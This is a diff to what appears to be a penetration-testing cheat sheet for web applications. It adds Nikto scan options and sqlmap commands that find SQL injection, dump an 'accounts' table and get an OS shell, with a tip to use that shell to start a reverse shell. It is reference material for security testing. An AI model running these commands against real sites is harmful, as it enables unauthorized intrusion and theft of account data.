@@ -10,7 +10,20 @@
   <summary>Methodology</summary>
   <br>
     
-  - Have a crawler going against the site
+  - Have a BURP audit and crawler going against the site
+ 
+  - Nikto scan 
+  
+        nikto -update 
+  
+        nikto -dbcheck
+        
+        nikto -h <url> 
+        
+          -p port          
+          -ssl  force ssl on port
+          -nossl disable use of ssl
+          -id <username>:<password>
   
   - Have gobuster running
   
@@ -246,13 +259,18 @@
      
      user() gets user running SQL
      
- **SQLMap** once vectors have been identified: 
+ **SQLMap**
  
    [Cheatsheet 1](https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d)
    
+   Identifying SQL vulnerabilities 
+   
+    sqlmap -u "<url><resource>?id=1"
+   
+   
    sqlmap with GET request
    
-     sqlmap -u <url><resource>?id=1 -p id
+     sqlmap -u "<url><resource>?id=1" -p id
      
       --cookie="<cookie>"
      
@@ -269,6 +287,12 @@
    Get contents
    
     sqlmap -u <url><resource>?id=1 -D awd -T accounts --dump
+    
+   Get OS shell
+   
+    --os-shell   
+    
+   this can sometimes be unstable and is a good idea to use this to initicate a reverse [shell](https://github.com/Kahvi-0/Cheat-Sheets/tree/master/Shell%20code)
 
    SQL query example:
    
